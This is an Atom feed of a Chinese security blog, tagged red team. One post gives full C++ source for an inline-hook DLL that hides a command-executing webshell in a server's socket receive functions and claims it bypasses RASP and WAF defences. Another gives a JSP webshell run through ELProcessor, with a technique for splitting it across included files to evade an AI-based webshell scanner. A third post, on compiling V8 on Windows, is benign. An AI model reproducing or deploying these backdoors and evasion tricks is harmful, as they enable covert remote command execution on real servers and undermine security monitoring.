<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jayl1n&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://jayl1n.github.io/"/>
  <updated>2021-06-25T06:31:55.164Z</updated>
  <id>https://jayl1n.github.io/</id>
  
  <author>
    <name>Jayl1n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>利用 Hook 技术打造通用的 Webshell</title>
    <link href="https://jayl1n.github.io/2021/06/25/use-inlinehook-technology-to-make-a-more-general-webshell/"/>
    <id>https://jayl1n.github.io/2021/06/25/use-inlinehook-technology-to-make-a-more-general-webshell/</id>
    <published>2021-06-25T06:08:53.000Z</published>
    <updated>2021-06-25T06:31:55.164Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>标题中的 “通用” 指跨语言，本文的实现是基于 Windows 的，需要 Linux 的可以参考本文的思路，实现起来并没有太大区别。</p></blockquote><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>Windows 上程序涉及网络 socket 操作，一般都会用到 winsock2 的库，程序会动态链接 <code>ws2_32.dll</code> ，JVM，Python，Zend 等解释器都不例外。</p><p>winsock2 里 socket 操作相关的函数 <code>recv</code> <code>send</code> <code>closesocket</code> 会编程的应该都不陌生。<strong>hook 掉 <code>recv</code> 函数就可以在程序处理接受到网络数据前，进入我们的处理逻辑早一步收到数据。</strong></p><p>由于实现是 native 的，所以在成功 hook 的情况下能绕过现代的 RASP、IAST、云WAF 等现代流行的防护技术。</p><h1 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h1><p>Inline Hook 是在程序运行时直接修改指令，插入跳转指令（jmp/call/retn）来控制程序执行流的一种技术。相比别的 Hook 技术，Inline Hook 优点是能跨平台，稳定，本文是以此技术实现的。</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>具体实现分为两个部分，一个是hook函数的 DLL(只讲这个)；另一个是向进程注入 DLL 的辅助工具(网上的文章很多，需要的见完整源码)。</p><h2 id="InstallHook"><a href="#InstallHook" class="headerlink" title="InstallHook"></a>InstallHook</h2><p>安装钩子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> START_BLOCK <span class="meta-string">"#CMD0#"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> END_BLOCK <span class="meta-string">"#CMD1#"</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwInstSize = <span class="number">12</span>;</span><br><span class="line">BYTE RecvEntryPointInst[<span class="number">12</span>] = &#123; <span class="number">0x00</span> &#125;;</span><br><span class="line">BYTE RecvEntryPointInstHook[<span class="number">12</span>] = &#123; <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span> &#125;;</span><br><span class="line">BYTE WSARecvEntryPointInst[<span class="number">12</span>] = &#123; <span class="number">0x00</span> &#125;;</span><br><span class="line">BYTE WSARecvEntryPointInstHook[<span class="number">12</span>] = &#123; <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNRecv )</span><span class="params">( SOCKET, <span class="keyword">char</span>*, <span class="keyword">int</span>, <span class="keyword">int</span> )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNSend )</span><span class="params">( SOCKET, <span class="keyword">char</span>*, <span class="keyword">int</span>, <span class="keyword">int</span> )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNWSARecv )</span> <span class="params">( SOCKET, LPWSABUF, DWORD, LPDWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNWSASend )</span> <span class="params">( SOCKET, LPWSABUF, DWORD, LPDWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InstallHook</span><span class="params">(LPCWSTR lpModule, LPCSTR lpFuncName, LPVOID lpFunction)</span> </span>&#123;</span><br><span class="line">DWORD_PTR FuncAddress = (UINT64) GetProcAddress(GetModuleHandleW(lpModule), lpFuncName);</span><br><span class="line">DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(VirtualProtect((LPVOID) FuncAddress, dwInstSize, PAGE_EXECUTE_READWRITE, &amp;OldProtect))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"recv"</span>)) &#123;</span><br><span class="line"><span class="built_in">memcpy</span>(RecvEntryPointInst, (LPVOID) FuncAddress, dwInstSize);</span><br><span class="line">*(PINT64) ( RecvEntryPointInstHook + <span class="number">2</span> ) = (UINT64) lpFunction;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"WSARecv"</span>)) &#123;</span><br><span class="line"><span class="built_in">memcpy</span>(WSARecvEntryPointInst, (LPVOID) FuncAddress, dwInstSize);</span><br><span class="line">*(PINT64) ( WSARecvEntryPointInstHook + <span class="number">2</span> ) = (UINT64) lpFunction;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"recv"</span>)) </span><br><span class="line"><span class="built_in">memcpy</span>((LPVOID) FuncAddress, &amp;RecvEntryPointInstHook, <span class="keyword">sizeof</span>(RecvEntryPointInstHook));</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName,<span class="string">"WSARecv"</span>))</span><br><span class="line"><span class="built_in">memcpy</span>((LPVOID) FuncAddress, &amp;WSARecvEntryPointInstHook, <span class="keyword">sizeof</span>(WSARecvEntryPointInstHook));</span><br><span class="line"></span><br><span class="line">VirtualProtect((LPVOID) FuncAddress, dwInstSize, OldProtect, &amp;OldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="UninstallHook"><a href="#UninstallHook" class="headerlink" title="UninstallHook"></a>UninstallHook</h2><p>卸载钩子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UninstallHook</span><span class="params">(LPCWSTR lpModule, LPCSTR lpFuncName)</span> </span>&#123;</span><br><span class="line">UINT64 FuncAddress = (UINT64) GetProcAddress(GetModuleHandleW(lpModule), lpFuncName);</span><br><span class="line">DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(VirtualProtect((LPVOID) FuncAddress, dwInstSize, PAGE_EXECUTE_READWRITE, &amp;OldProtect))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"recv"</span>)) </span><br><span class="line"><span class="built_in">memcpy</span>((LPVOID) FuncAddress, RecvEntryPointInst, <span class="keyword">sizeof</span>(RecvEntryPointInst));</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName,<span class="string">"WSARecv"</span>))</span><br><span class="line"><span class="built_in">memcpy</span>((LPVOID) FuncAddress, WSARecvEntryPointInst, <span class="keyword">sizeof</span>(WSARecvEntryPointInst));</span><br><span class="line">&#125;</span><br><span class="line">VirtualProtect((LPVOID) FuncAddress, dwInstSize, OldProtect, &amp;OldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HookRecv"><a href="#HookRecv" class="headerlink" title="HookRecv"></a>HookRecv</h2><p>hook recv 的函数，程序在执行 recv 时，会先进入这个函数。</p><p>在这个函数里，调用原来的 recv 获取数据，判断是否有<code>START_BLOCK</code>、<code>END_BLOCK</code>块，有的话就取出块之间的命令，执行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">HookRecv</span><span class="params">(SOCKET s, <span class="keyword">char</span>* buf, <span class="keyword">int</span> len, <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line">UninstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"recv"</span>);</span><br><span class="line"></span><br><span class="line">PFNRecv pfnRecv = (PFNRecv) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"recv"</span>);</span><br><span class="line">PFNSend pfnSend = (PFNSend) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"send"</span>);</span><br><span class="line">PFNClosesocket pfnClosesocket = (PFNClosesocket) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"closesocket"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> rc = pfnRecv(s, buf, len, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* startBlock = <span class="built_in">strstr</span>(buf, START_BLOCK);</span><br><span class="line"><span class="keyword">if</span>(startBlock) &#123;</span><br><span class="line"><span class="keyword">char</span>* endBlock = <span class="built_in">strstr</span>(startBlock, END_BLOCK);</span><br><span class="line"><span class="keyword">if</span>(endBlock) &#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> start_block = <span class="built_in">std</span>::<span class="built_in">string</span>(startBlock);</span><br><span class="line"><span class="keyword">int</span> endOffset = start_block.find(END_BLOCK, <span class="keyword">sizeof</span>(START_BLOCK));</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> cmd = start_block.substr(<span class="keyword">sizeof</span>(START_BLOCK) - <span class="number">1</span>, start_block.size() - <span class="keyword">sizeof</span>(START_BLOCK) - ( start_block.size() - endOffset ) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> output = WSTR2STR(ExecuteCmd(cmd));</span><br><span class="line"></span><br><span class="line">pfnSend(s, (<span class="keyword">char</span>*) output.c_str(), output.size(), <span class="number">0</span>);</span><br><span class="line">         pfnClosesocket(s);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"recv"</span>, (LPVOID) HookRecv);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>  rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">HookWSARecv</span><span class="params">(SOCKET s, LPWSABUF lpBuffer, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">UninstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"WSARecv"</span>);</span><br><span class="line"></span><br><span class="line">PFNWSARecv pfnWSARecv = (PFNWSARecv) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"WSARecv"</span>);</span><br><span class="line">PFNWSASend pfnWSASend = (PFNWSASend) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"WSASend"</span>);</span><br><span class="line">PFNClosesocket pfnClosesocket = (PFNClosesocket) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"closesocket"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> rc = pfnWSARecv(s, lpBuffer, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* startBlock = <span class="built_in">strstr</span>(lpBuffer-&gt;buf, START_BLOCK);</span><br><span class="line"><span class="keyword">if</span>(startBlock) &#123;</span><br><span class="line"><span class="keyword">char</span>* endBlock = <span class="built_in">strstr</span>(startBlock, END_BLOCK);</span><br><span class="line"><span class="keyword">if</span>(endBlock) &#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> start_block = <span class="built_in">std</span>::<span class="built_in">string</span>(startBlock);</span><br><span class="line"><span class="keyword">int</span> endOffset = start_block.find(END_BLOCK, <span class="keyword">sizeof</span>(START_BLOCK));</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> cmd = start_block.substr(<span class="keyword">sizeof</span>(START_BLOCK) - <span class="number">1</span>, start_block.size() - <span class="keyword">sizeof</span>(START_BLOCK) - ( start_block.size() - endOffset ) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">WSABUF outBuf;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> output = WSTR2STR(ExecuteCmd(cmd));</span><br><span class="line">outBuf.buf = (<span class="keyword">char</span>*) output.c_str();</span><br><span class="line">outBuf.len = output.size();</span><br><span class="line"></span><br><span class="line">pfnWSASend(s, &amp;outBuf, <span class="number">1</span>, lpNumberOfBytesRecvd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">         pfnClosesocket(s);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"WSARecv"</span>, (LPVOID) HookWSARecv);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>  rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里还 hook 了 <code>WSARecv</code> ，是因为我在 Tomcat 上测试遇到个问题  hook <code>recv</code> 后收到的数据是乱码，长度也对不上。 后来想到 Tomcat 现在默认是 NIO 处理，JVM 的用的 API 可能不一样，翻看了一下源码，发现 Windows 上 NIO 相关的 socket 操作函数实际用的是 <code>WSARecv</code>、<code>WSASend</code> 等带 <code>WSA</code> 前缀的，加了 hook 点之后能正常读到数据了。</p></blockquote><h2 id="DllMain"><a href="#DllMain" class="headerlink" title="DllMain"></a>DllMain</h2><p>DLL 入口，调用安装钩子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span> </span>&#123;</span><br><span class="line"><span class="keyword">switch</span>(fdwReason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"recv"</span>, (LPVOID) HookRecv);</span><br><span class="line">InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"WSARecv"</span>, (LPVOID) HookWSARecv);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p><img src="/2021/06/25/use-inlinehook-technology-to-make-a-more-general-webshell/java.gif" alt="java"></p><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p><img src="/2021/06/25/use-inlinehook-technology-to-make-a-more-general-webshell/python.gif" alt="python"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;标题中的 “通用” 指跨语言，本文的实现是基于 Windows 的，需要 Linux 的可以参考本文的思路，实现起来并没有太大区别。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;header
      
    
    </summary>
    
    
    
      <category term="开发" scheme="https://jayl1n.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
      <category term="Java" scheme="https://jayl1n.github.io/tags/Java/"/>
    
      <category term="RedTeam" scheme="https://jayl1n.github.io/tags/RedTeam/"/>
    
      <category term="红蓝对抗" scheme="https://jayl1n.github.io/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
      <category term="工具分享" scheme="https://jayl1n.github.io/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>在 Win10 上编译 V8 引擎</title>
    <link href="https://jayl1n.github.io/2021/06/23/compile-v8-on-windows10/"/>
    <id>https://jayl1n.github.io/2021/06/23/compile-v8-on-windows10/</id>
    <published>2021-06-23T12:40:40.000Z</published>
    <updated>2021-06-23T12:55:02.315Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下编译 V8 踩坑的过程（以下全程需要科学上网，我是配了 Proxifier）</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><ol start="0"><li><p>先安装 VisualStudio 2019，略详细过程</p></li><li><p>clone 开发环境</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /d d:\</span><br><span class="line"></span><br><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set DEPOT_TOOLS_WIN_TOOLCHAIN = 0</span><br><span class="line">set GYP_MSVS_VERSION = 2019    # 或者 2017</span><br></pre></td></tr></table></figure></li><li><p>clone v8 仓库，完整的大概 700M</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br></pre></td></tr></table></figure></li><li><p>同步第三方组件，会花一点时间</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gclient sync</span><br></pre></td></tr></table></figure></li><li><p>生成编译配置</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tools/dev/v8gen.py ia32.debug</span><br></pre></td></tr></table></figure></li><li><p>编译，大概 10 分钟</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ninja -C .\out.gn\ia32.debug d8 -j12</span><br></pre></td></tr></table></figure></li><li><p>完成</p></li></ol><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h2 id="提示缺少-LASTCHANGE"><a href="#提示缺少-LASTCHANGE" class="headerlink" title="提示缺少 LASTCHANGE"></a>提示缺少 LASTCHANGE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\build\util\lastchange.py .\build\util\LASTCHANGE</span><br></pre></td></tr></table></figure><h2 id="找不到-clang-cl-exe"><a href="#找不到-clang-cl-exe" class="headerlink" title="找不到 clang-cl.exe"></a>找不到 clang-cl.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\tools\clang\scripts\update.py</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一下编译 V8 踩坑的过程（以下全程需要科学上网，我是配了 Proxifier）&lt;/p&gt;
&lt;h1 id=&quot;过程&quot;&gt;&lt;a href=&quot;#过程&quot; class=&quot;headerlink&quot; title=&quot;过程&quot;&gt;&lt;/a&gt;过程&lt;/h1&gt;&lt;ol start=&quot;0&quot;&gt;
&lt;li&gt;&lt;p&gt;先
      
    
    </summary>
    
    
    
      <category term="开发" scheme="https://jayl1n.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>JSP免杀 —— 绕过智能AI？</title>
    <link href="https://jayl1n.github.io/2021/02/05/antiav-jsp-webshell/"/>
    <id>https://jayl1n.github.io/2021/02/05/antiav-jsp-webshell/</id>
    <published>2021-02-05T14:25:31.000Z</published>
    <updated>2021-02-07T08:23:56.444Z</updated>
    
    <content type="html"><![CDATA[<p>玩某云的“卷完计划”想到的姿势，分享一下。</p><p>某云的骑士号称是采用先进的动态监测技术，结合主机智能内核AI检测技术等多种引擎零规则查杀，做到低误报，高查杀率。</p><p>测下来查杀率确实高，只要出现 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code> 等命令执行直接相关的方法调用就杀，不过一个样本测下来要一分钟，速度相当慢，实际落地还要很长的路要走。/狗头</p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>开始讲绕过。</p><p>首先是命令执行的sink，直接写 <code>Runtime.getRuntime().exec()</code> 即使jsp编译不通过也是会被check到的，说明引擎有一些强检测逻辑，类似正则，匹配即杀。而如果迂回一下，我们找一个跳板，比如 <code>new ProcessBuilder()</code> ，或者反射构造 <code>ProcessImpl</code> 实例，还不会被杀，(用法参考<a href="https://xz.aliyun.com/t/7798" target="_blank" rel="noopener">三梦的文章</a>)。</p><p>构造好跳板，当调用 <code>start()</code> 实际执行的时候，如果命令是硬编码的没有杀，如果是从 request.getParameter(“xxx”) 取的还是会杀的。</p><p>说明引擎应该用到了类似污点分析的原理，更换命令执行的 sink 是可以绕过的，但要完全绕过还要找别的 source，试了一圈 request 对象的方法，只有 request.getSchema() 等内容不可控方法的时候不会杀，内容不可控有啥用:(</p><p>研究了下，我想到了这个引擎的问题（应该也通杀别的），就是在检测时，无法构造出完整的上下文环境。它是单文件一个个扫过去的，如果我们拆分 soure-sink 到多个文件呢，扫任意一个jsp都没问题。甚至很可能因为通不过编译，压根儿动态监测不起来。</p><h1 id="include"><a href="#include" class="headerlink" title="include"></a>include</h1><p>下面用到 jsp 的一个特性 include 指令。</p><blockquote><p>include 指令用于通知 JSP 引擎在翻译当前 JSP 页面时，将其他文件中的内容合并进当前 JSP 页面转换成的 Servlet 源文件中，这种在源文件级别进行引入的方式，称为静态引入，当前 JSP 页面与静态引入的文件紧密结合为一个 Servlet。这些文件可以是 JSP 页面、HTML 页面、文本文件或是一段 Java 代码。</p></blockquote><p>我们完全可以把完整的逻辑拆分，即把参数获取和命令执行的分开。</p><p>举个例子</p><p>AB.jsp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;javax.el.ELProcessor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    ELProcessor processor = new ELProcessor();</span><br><span class="line">    Process process = (Process) processor.eval(</span><br><span class="line">            &quot;\&quot;\&quot;.getClass()&quot; +</span><br><span class="line">                    &quot;.forName(\&quot;javax.script.ScriptEngineManager\&quot;).&quot; +</span><br><span class="line">                    &quot;newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&apos;(java.lang.String[])&apos;]([&apos;&quot; +</span><br><span class="line">                    cmd + &quot;&apos;]).start()\&quot;)&quot;);</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    while ((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">        sb.append(line).append(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    response.getOutputStream().write(sb.toString().getBytes());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>source request.getParameter，通过 sink ELProcessor.eval 执行命令，会被杀。</p><p>拆分逻辑到 A.jsp B.jsp</p><p>A.jsp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>B.jsp ELProcessor.eval 执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 